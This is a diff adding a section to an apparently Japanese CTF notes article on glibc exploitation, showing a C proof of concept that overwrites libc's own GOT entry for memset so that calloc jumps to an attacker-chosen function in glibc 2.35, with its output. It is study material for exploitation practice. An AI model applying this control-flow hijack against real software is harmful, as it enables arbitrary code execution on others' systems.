@@ -26,6 +26,7 @@ target関数が直接呼び出さずに実行されていることをもって�
 - [\__printf_function_table / \__printf_arginfo_table](#printf-function-table-x2F-printf-arginfo-table)
 - [\_rtld_global](#rtld-global)
 - [\_dl_open_hook](#dl-open-hook)
+- [GOT overwrite in libc(追記)](#GOT-overwrite-in-libc-追記)
 
 ## \_free_hook / \_malloc_hook
 2.34でシンボルが消された
@@ -594,6 +595,72 @@ abort時の__libc_message()内のBEFORE_ABORT(backtrace_and_mapsのマクロ)が
 https://dangokyo.me/2018/01/20/extra-exploitation-technique-1-_dl_open/
 * backtarce_and_mapsの呼び出し(2.30)
 https://elixir.bootlin.com/glibc/glibc-2.30.9000/source/sysdeps/posix/libc_fatal.c#L178
+
+## GOT overwrite in libc(追記)
+twitterより
+
+{% raw %}
+<blockquote class="twitter-tweet" data-partner="tweetdeck"><p lang="ja" dir="ltr">__free_hookの代替としてlibcのGOT書き換えも（状況によっては、割と便利に）使える気がする。ctf4bバイナリでは、ちょうどcallocが使われていたので、memsetのoverwriteをしました。<a href="https://t.co/jwGCr0k6iA">https://t.co/jwGCr0k6iA</a></p>&mdash; mora (@moratorium08) <a href="https://twitter.com/moratorium08/status/1540370436709486593?ref_src=twsrc%5Etfw">June 24, 2022</a></blockquote>
+<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+{% endraw %}
+
+moraさんあざます🙏
+
+2.35でも使えたテクニックで、glibcバイナリのgot overwrite。
+
+以下は教えてもらったtweet通りcalloc内で呼ばれるmemsetのgotを書き換えた。
+本記事で何回も出している__run_exit_handlerでもfree呼ばれるからfree@gotを書き換えようと思ったら、
+free@gotはreadonlyのページに配置されていた。同じlibcのgot領域でも書き込み可否が変わるのか。
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+// differ in each environment
+unsigned long off_puts = 0x80ed0;
+unsigned long off_got_memset_in_libc = 0x219188;
+
+void target1(unsigned long arg1)
+{
+    printf("In target1(): arg1=0x%lx\n", arg1);
+    return;
+}
+
+void main()
+{
+    printf("Start of main()\n");
+
+    void* libc_base = &puts - (unsigned long)off_puts;
+    printf("libc_base = %p\n",libc_base);
+    void* got_memset_in_libc = libc_base + off_got_memset_in_libc;
+    printf("got_memset_in_libc = %p\n",got_memset_in_libc);
+
+    // before overwrite
+    void* ptr = calloc(0x58,1);
+
+    // overwrite symbols
+    *(unsigned long*)got_memset_in_libc = target1;
+
+    puts("before memset()");
+
+    memset(ptr, 0, 0x58); // not work (memset() from user binary)
+
+    puts("before calloc()");
+
+    ptr = calloc(0x58,1); // exploit (memset() from libc)
+    puts("End of main()");
+    return;
+}
+```
+```
+$ ./got_in_libc 
+Start of main()
+libc_base = 0x7fc77cbf0000
+got_memset_in_libc = 0x7fc77ce09188
+before memset()
+before calloc()
+In target1(): arg1=0x55c178b23710
+End of main()
+```
 
 # 終わりに
 実はこれはctf4bのmonkey heapが解けなかった際の供養
